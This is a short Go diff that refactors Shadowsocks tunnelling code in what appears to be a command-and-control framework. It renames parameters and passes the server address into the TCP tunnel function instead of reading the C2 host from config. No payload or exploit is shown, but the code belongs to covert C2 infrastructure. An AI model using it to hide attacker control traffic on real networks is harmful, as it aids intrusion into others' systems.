@@ -11,8 +11,8 @@ import (
 
 var SS_Ctx, SS_Cancel = context.WithCancel(context.Background())
 
-func startShadowsocksClient(serverAddr, localSocksAddr, tcptun string) {
-	ss_config := createSSConfig(serverAddr, localSocksAddr, tcptun, false)
+func startShadowsocksClient(ss_serverAddr, localSocksAddr, tcptun string) {
+	ss_config := createSSConfig(ss_serverAddr, localSocksAddr, tcptun, false)
 	err := ss.SSMain(ss_config)
 	if err != nil {
 		log.Fatalf("ShadowsocksProxy failed to start: %v", err)
@@ -65,14 +65,14 @@ func ShadowsocksC2Client() {
 
 // Start ShadowsocksTCPTunnel to connect to Shadowsocks server and forward traffic to a specified remote address
 // tcptun: "local_port=remote_host:remote_port,local_port=remote_host:remote_port"
-func ShadowsocksTCPTunnel(lport, raddr string) {
+func ShadowsocksTCPTunnel(ss_server, lport, raddr string) {
 	ss_server_port := RuntimeConfig.ShadowsocksServerPort
-	ss_server_addr := RuntimeConfig.CCHost
+	ss_server_ip := ss_server
 
-	server_addr := fmt.Sprintf("%s:%s", ss_server_addr, ss_server_port)
+	ss_server_addr := fmt.Sprintf("%s:%s", ss_server_ip, ss_server_port)
 
 	tcptun := fmt.Sprintf("127.0.0.1:%s=%s", lport, raddr)
-	startShadowsocksClient(server_addr, "", tcptun)
+	startShadowsocksClient(ss_server_addr, "", tcptun)
 }
 
 // Start Shadowsocks proxy server with RuntimeConfig.ShadowsocksPassword
